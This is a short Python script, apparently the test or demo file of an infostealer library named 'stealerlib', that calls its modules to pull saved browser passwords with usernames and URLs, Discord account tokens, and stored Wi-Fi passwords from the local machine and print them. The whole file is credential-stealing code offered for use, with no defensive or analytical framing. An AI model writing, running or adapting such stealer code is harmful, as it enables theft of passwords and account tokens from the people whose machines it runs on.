#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: tests.py
"""

from stealerlib.wifi import WiFi
from stealerlib.discord import Discord
from stealerlib.browser import Browser


if __name__ == '__main__':
    browser = Browser()
    passwords = browser.get_passwords()
    print(browser.passwords, '\n') # -> [(username, password, url, created, last_used), ...]

    client = Discord()
    client.get_tokens()
    print(client.tokens, '\n') # -> [token1, token2, ...]

    network = WiFi()
    network.get_wifi_passwords()
    print(network.credentials, '\n') # -> [(ssid, password), ...]